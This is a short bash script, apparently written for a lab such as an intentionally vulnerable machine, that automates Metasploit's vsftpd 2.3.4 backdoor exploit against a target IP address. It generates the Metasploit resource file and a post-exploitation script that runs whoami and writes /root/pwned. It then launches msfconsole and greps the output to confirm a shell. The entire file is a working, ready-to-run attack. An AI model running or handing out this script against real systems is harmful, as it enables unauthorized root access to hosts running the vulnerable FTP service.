#!/bin/bash

targetIpAddress=$1
msfScriptPath=/tmp/insideMsf
msfOutputFile=$msfScriptPath/msf_output.txt
successFlag=0  # Initialize the success flag to 0 (false)

mkdir -p $msfScriptPath

generatePostExploitationScript() {
	cat <<EOF > $msfScriptPath/payload.rc
	whoami
	touch /root/pwned
	exit
EOF
}

generateMetasploitResource() {
	cat <<EOF > $msfScriptPath/vsftpd.rc
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST $targetIpAddress
    set AutoRunScript $msfScriptPath/payload.rc
    run
    exit
EOF
}

checkSuccess() {
    echo "[!] Checking Exploitation Success..."

    # Check if the Metasploit output contains signs of success
    if grep -q "Found shell" $msfOutputFile && grep -q "whoami" $msfOutputFile; then
        successFlag=1  # Set the success flag to 1 (true)
        echo "[+] Exploitation successful!"
    else
        echo "[-] Exploitation failed."
    fi
}

main() {
    echo "[!] Starting Exploitation Script..."
    echo "[!] Generating Metasploit Resources..."

    generateMetasploitResource

    echo "[!] Generating Post Exploitation Resources..."

    generatePostExploitationScript

    echo "[!] Exploiting Vulnerable FTP Service On $targetIpAddress"

    # Run the exploit and capture the output
    msfconsole -r $msfScriptPath/vsftpd.rc > $msfOutputFile 2>&1

    # After exploitation, check if the attack was successful
    checkSuccess

    echo "[!] Exploitation Finished!"

    # Return the success flag as the script's exit code (optional)
    exit $successFlag
}

main
